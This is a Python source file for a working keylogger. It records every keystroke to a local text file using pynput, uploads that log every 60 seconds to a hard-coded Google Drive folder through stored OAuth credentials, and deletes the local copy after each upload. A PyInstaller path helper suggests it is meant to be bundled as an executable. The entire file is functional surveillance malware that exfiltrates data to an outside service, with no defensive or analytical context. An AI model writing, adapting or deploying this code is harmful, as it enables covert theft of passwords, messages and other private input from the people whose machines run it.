import os
import time
import threading
import pickle
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
from googleapiclient.errors import HttpError
from pynput import keyboard
from google.auth.transport.requests import Request
import sys

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# --- CONFIG ---
SCOPES = ['https://www.googleapis.com/auth/drive.file']
CREDENTIALS_FILE = resource_path('credentials.json')

TOKEN_PICKLE = resource_path('token.pickle')
FOLDER_ID = '1XmC4uE28r4EfMO4fJezd9WhpVrMPooky'  # your folder ID
LOG_FILE_BASE = "keystrokes"  # base name without extension
UPLOAD_INTERVAL = 60  # seconds

# Global variables
current_log_file = f"{LOG_FILE_BASE}.txt"
logging_lock = threading.Lock()
stop_flag = False

# --- AUTHENTICATE ---
def authenticate():
    creds = None
    if os.path.exists(TOKEN_PICKLE):
        with open(TOKEN_PICKLE, 'rb') as token:
            creds = pickle.load(token)
    if creds:
        print(f"Credentials loaded. valid={creds.valid}, expired={creds.expired}, refresh_token={'Yes' if creds.refresh_token else 'No'}")
    else:
        print("No credentials file found")

    if creds and creds.expired and creds.refresh_token:
        try:
            creds.refresh(Request())
            with open(TOKEN_PICKLE, 'wb') as token_file:
                pickle.dump(creds, token_file)
            print("Credentials refreshed")
        except Exception as e:
            print(f"⚠️ Token refresh failed: {e}")
            return None

    if not creds or not creds.valid:
        print("❌ No valid credentials available, and no interactive login allowed.")
        return None

    return build('drive', 'v3', credentials=creds)


# --- UPLOAD FILE ---
def upload_file(service, file_path, file_name, folder_id):
    try:
        file_metadata = {
            'name': file_name,
            'parents': [folder_id]
        }
        media = MediaFileUpload(file_path, resumable=True)
        file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
        print(f"✅ Uploaded '{file_name}' to folder ID: {folder_id}, File ID: {file.get('id')}")
        return True
    except HttpError as error:
        print(f"❌ Failed to upload file: {error}")
        return False

# --- PERIODIC UPLOAD THREAD ---
def periodic_upload():
    global current_log_file, stop_flag

    service = authenticate()

    while not stop_flag:
        time.sleep(UPLOAD_INTERVAL)

        # Lock logging to avoid race conditions with file write
        with logging_lock:
            if not os.path.exists(current_log_file):
                print(f"⚠️ No log file to upload: {current_log_file}")
                continue

            print(f"\n🔁 Uploading {current_log_file} to Google Drive...")
            success = upload_file(service, current_log_file, current_log_file, FOLDER_ID)
            if success:
                # Delete old file after upload
                os.remove(current_log_file)
                print(f"🗑️ Deleted local log file '{current_log_file}'")
                # Create new file name with timestamp (optional)
                current_log_file = f"{LOG_FILE_BASE}_{int(time.time())}.txt"

# --- KEYLOGGER CALLBACKS ---
def on_press(key):
    with logging_lock:
        try:
            with open(current_log_file, "a", encoding='utf-8') as f:
                f.write(key.char)
        except AttributeError:
            with open(current_log_file, "a", encoding='utf-8') as f:
                f.write(f" [{key.name}] ")

def on_release(key):
    global stop_flag
    if key == keyboard.Key.esc:
        print("\n🛑 ESC pressed. Stopping...")
        stop_flag = True
        return False  # Stop listener

# --- MAIN ---
if __name__ == "__main__":
    print("🔒 Keylogger started. Press ESC to stop.")

    # Start upload thread
    upload_thread = threading.Thread(target=periodic_upload, daemon=True)
    upload_thread.start()

    # Start keylogger (blocking)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    print("⌛ Waiting for uploader thread to finish...")
    upload_thread.join()
    print("✅ Exiting program.")
